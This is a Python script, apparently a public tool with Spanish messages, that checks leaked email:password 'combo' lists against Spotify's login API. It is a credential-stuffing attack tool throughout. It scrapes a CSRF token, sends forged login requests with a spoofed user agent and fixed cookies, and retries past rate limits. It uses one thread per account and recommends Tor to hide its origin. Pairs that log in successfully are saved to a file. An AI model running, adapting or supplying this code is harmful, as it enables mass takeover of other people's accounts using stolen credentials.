import argparse, socks
import threading
from colorama import Fore, init
import os, sys
import socket, time
from tqdm import tqdm
import ssl, json

init()

ACCOUNTS = []
OT = []

def header():
    print(r'''
 ________  ________  ________  _________  ________  ___  ___  _______   ________  ___  __       
|\   ____\|\   __  \|\   __  \|\___   ___\\   ____\|\  \|\  \|\  ___ \ |\   ____\|\  \|\  \     
\ \  \___|\ \  \|\  \ \  \|\  \|___ \  \_\ \  \___|\ \  \\\  \ \   __/|\ \  \___|\ \  \/  /|_   
 \ \_____  \ \   ____\ \  \\\  \   \ \  \ \ \  \    \ \   __  \ \  \_|/_\ \  \    \ \   ___  \  
  \|____|\  \ \  \___|\ \  \\\  \   \ \  \ \ \  \____\ \  \ \  \ \  \_|\ \ \  \____\ \  \\ \  \ 
    ____\_\  \ \__\    \ \_______\   \ \__\ \ \_______\ \__\ \__\ \_______\ \_______\ \__\\ \__\
   |\_________\|__|     \|_______|    \|__|  \|_______|\|__|\|__|\|_______|\|_______|\|__| \|__|
   \|_________|                                                                                 
 
By MrSentex | @fbi_sentex | www.github.com/MrSentex | www.gitlab.com/MrSentex | v0.3-Beta
''')

class colors:
    @staticmethod
    def error(msg):
        print('[' + Fore.LIGHTRED_EX + '-' + Fore.RESET + '] ' + str(msg))
    @staticmethod
    def correct(msg):
        print('[' + Fore.LIGHTGREEN_EX + '*' + Fore.RESET + '] ' + str(msg))
    @staticmethod
    def info(msg):
        print('[' + Fore.LIGHTBLUE_EX + '#' + Fore.RESET + '] ' + str(msg))

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def get_csrf_token(data):
    data = data.decode()
    data = data[data.find('csrf_token=')+11: len(data)]
    csrf = data[0:data.find(';Version')]
    return csrf

def plain_http_request_to_json(http_requests):
    http_requests = http_requests.decode()

    n = http_requests.find('{')
    return http_requests[n:len(http_requests)]

def true_or_false_json(json_data):
    if 'error' in json_data:
        return False
    return True

def post_data(username, password, csrf_token):
    return '''\
POST /api/login HTTP/1.0\r
Host: accounts.spotify.com\r
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4\r
Accept: application/json, text/plain\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {}\r
Cookie: fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token={}; __bon=MHwwfDE1MTEzNzE0OTl8NjM0Nzc2MDI5NTh8MXwxfDF8MQ==; remember=true@true.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376\r
\r
remember=true&username={}&password={}&csrf_token={}'''.format(str(len('remember=true&username={}&password={}&csrf_token={}'.format(username, password, csrf_token))), csrf_token, username, password, csrf_token).encode()

def make_post(account, csrf_token):

    while True:
        no_ssl_socket = socks.socksocket()
        ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)

        ssl_socket.connect(('accounts.spotify.com', 443))
        ssl_socket.sendall(post_data(account[0], account[1], csrf_token))
        api_data = ssl_socket.recv(10000)
        if '429 Too' in api_data.decode():
            time.sleep(1)
            continue
        api_data_plain = plain_http_request_to_json(api_data)
        return api_data_plain

def output(email, password):
    OT.append([email, password])

def load_list(list):
    colors.info('Cargando combo...')
    if not os.path.isfile(list):
        colors.error('{} no existe o no es un archivo')
        sys.exit()
    with open(list, 'r') as list_file:
        lines = list_file.readlines()

        for line in lines:
            line = line.replace(' ','').replace('\n', '')
            if len(line.split(':')) > 2:
                continue
            else:
                pass
            try:
                ACCOUNTS.append([line.split(':')[0], line.split(':')[1]])
            except Exception:
                pass
        colors.correct('Se han cargado {} cuentas\n'.format(str(len(ACCOUNTS))))

def check_account(account):
    try:
        while True:
            no_ssl_socket = socks.socksocket()
            ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
            ssl_socket.connect(('accounts.spotify.com', 443))
            ssl_socket.sendall(b'GET / HTTP/1.1\r\nHost: accounts.spotify.com\r\n\r\n')
            spotify_cookies_data = ssl_socket.recv(10000)
            if '429 Too' in spotify_cookies_data.decode():
                time.sleep(1)
                continue
            else:
                break
    except Exception as e:
        colors.error('Error! | '+str(e))
        sys.exit()
    csrf_token = get_csrf_token(spotify_cookies_data)
    if true_or_false_json(make_post(account, csrf_token)):
        output(account[0], account[1])

def thread(list_):
    for email, password in list_:
        check_account([email, password])

def start():
    s_time = time.time()
    load_list(args.combo)
    if not args.nothreads:
        
        threads = []
        for account in ACCOUNTS:
            t = threading.Thread(target=check_account, args=(account, ))
            threads.append(t)
        for x in threads:
            x.start()
        r = 0
        for i in tqdm(range(int(len(threads))), ascii=True, desc="Procesando"):
            threads[r].join()
            r+=1

        with open(args.output, 'w') as output:
            for x in OT:
                output.write(x[0] + ':' + x[1] + '\n')
        output.close()

    else:
        thread(ACCOUNTS)
    print('')
    colors.correct('Se han procesado {} cuentas en {} segundos'.format(str(len(ACCOUNTS)), str(time.time() - s_time).split('.')[0]))
clear()
header()
parser = argparse.ArgumentParser()
parser.add_argument('combo', help='Especificar combo')
parser.add_argument('output', help='Archivo de salido')
parser.add_argument('--tor', help='Usar tor (Recomendado)', action='store_true')
parser.add_argument('--nothreads', help="Deshabilita el uso de threads (Impacto en el rendimiento)", action='store_true')
args = parser.parse_args()


if args.tor:
    socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9050)
try:
    start()
except KeyboardInterrupt:
    os._exit(0)